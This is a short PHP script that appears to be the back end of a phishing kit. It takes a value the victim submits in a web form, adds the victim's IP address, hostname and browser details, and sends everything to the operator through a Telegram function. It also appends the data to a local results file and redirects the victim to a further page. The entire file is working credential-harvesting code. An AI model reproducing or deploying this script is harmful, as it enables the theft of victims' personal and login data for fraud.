<?php
require_once 'zabiosobi.php';
$ip = getenv("REMOTE_ADDR");
$message .= "---1/2/LAWLAPAGIX---\n";
$message .= "tran_flban_telele    	 : ".$_POST['ARCHIJO']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "----------LKHRA/1/1------------\n";
telegram_send(urlencode($message));
$fp = fopen('../alresult.txt', 'a');
fwrite($fp, $message);
fclose($fp);
header("Location: ../cordasa/cordasa.htm");?>